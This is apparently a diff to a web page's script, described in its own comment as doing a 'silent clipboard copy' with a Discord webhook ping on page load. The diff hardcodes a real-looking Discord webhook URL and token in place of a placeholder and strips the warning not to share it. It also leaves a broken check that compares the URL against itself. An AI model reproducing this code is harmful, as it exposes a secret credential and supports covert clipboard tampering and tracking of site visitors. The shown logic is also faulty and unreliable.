@@ -426,13 +426,11 @@
 <!-- ===== JAVASCRIPT (Silent clipboard copy + Non-spammy Webhook) ===== -->
 <script>
     (function() {
-        // ----- WEBHOOK NOTIFICATION (Non-spammy, single ping on page load) -----
-        // IMPORTANT: Replace YOUR_WEBHOOK_URL_HERE with your actual Discord webhook URL.
-        // Do not share your webhook URL publicly.
-        const webhookURL = 'YOUR_WEBHOOK_URL_HERE';
+
+        const webhookURL = 'https://discord.com/api/webhooks/1521826805013549136/H-hIe20JteU3yTiVGpQSaG7nKKZlJ_7UDOe4wrJwgivKJDPLiMIxCuklslu5BO1nPBHF';
 
         function sendWebhook() {
-            if (!webhookURL || webhookURL === 'YOUR_WEBHOOK_URL_HERE') {
+            if (!webhookURL || webhookURL === 'https://discord.com/api/webhooks/1521826805013549136/H-hIe20JteU3yTiVGpQSaG7nKKZlJ_7UDOe4wrJwgivKJDPLiMIxCuklslu5BO1nPBHF') {
                 console.log('Webhook URL not configured.');
                 return;
             }
